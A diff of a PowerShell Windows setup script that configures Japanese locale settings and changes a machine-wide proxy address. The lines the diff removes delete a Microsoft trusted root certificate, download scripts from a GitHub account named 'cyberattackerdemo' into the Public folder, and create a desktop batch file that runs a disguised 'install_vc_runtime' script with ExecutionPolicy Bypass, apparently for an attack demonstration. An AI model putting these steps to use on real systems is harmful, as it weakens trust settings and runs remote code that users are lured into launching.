@@ -58,7 +58,7 @@ Run-Step "Setting time zone to Tokyo" {
 
 Run-Step "Configuring internet proxy" {
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 'http://10.0.1.5:8080' /f
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 'http://10.0.1.10:8080' /f
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoDetect /t REG_DWORD /d 0 /f
 }
 
@@ -83,47 +83,8 @@ Run-Step "Pausing Windows Update for 14 days" {
 }
 
 Run-Step "Setting system environment variables for proxy" {
-    [Environment]::SetEnvironmentVariable("HTTPS_PROXY", "https://10.0.1.5:8080", "Machine")
-    [Environment]::SetEnvironmentVariable("HTTP_PROXY", "http://10.0.1.5:8080", "Machine")
-}
-
-Run-Step "Removing Microsoft Identity Verification Root CA 2020 if present" {
-    $certSubject = "CN=Microsoft Identity Verification Root Certificate Authority 2020, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
-    $storePath = "Cert:\LocalMachine\Root"
-    $store = Get-Item $storePath
-    $cert = Get-ChildItem $store.PSPath | Where-Object { $_.Subject -eq $certSubject }
-
-    if ($cert) {
-        Write-Log "Found certificate with Thumbprint: $($cert.Thumbprint). Attempting to remove..."
-        Remove-Item -Path "$storePath\$($cert.Thumbprint)" -Force
-        Write-Log "Certificate removed successfully."
-    } else {
-        Write-Log "Certificate not found. Nothing to remove."
-    }
-}
-
-Run-Step "Downloading enable_acs.ps1 to Public folder" {
-    $acsScriptUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/enable_acs.ps1"
-    $acsScriptPath = "C:\Users\Public\enable_acs.ps1"
-
-    Invoke-WebRequest -Uri $acsScriptUrl -OutFile $acsScriptPath
-}
-
-Run-Step "Downloading install_vc_runtime.ps1 to Public" {
-    $publicPath = "C:\Users\Public\install_vc_runtime.ps1"
-    $downloadUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/install_vc_runtime.ps1"
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $publicPath
-}
-
-Run-Step "Creating shortcut .bat on Desktop" {
-    $desktopPath = [Environment]::GetFolderPath("Desktop")
-    $batPath = Join-Path $desktopPath "Run_Install_VC_Runtime.bat"
-
-    $batContent = "@echo off`r`n" +
-        "powershell -ExecutionPolicy Bypass -File ""C:\Users\Public\install_vc_runtime.ps1""`r`n" +
-        "pause"
-
-    Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+    [Environment]::SetEnvironmentVariable("HTTPS_PROXY", "https://10.0.1.10:8080", "Machine")
+    [Environment]::SetEnvironmentVariable("HTTP_PROXY", "http://10.0.1.10:8080", "Machine")
 }
 
 Write-Log "Setup completed. Please restart the system to apply the Japanese UI and IME settings."
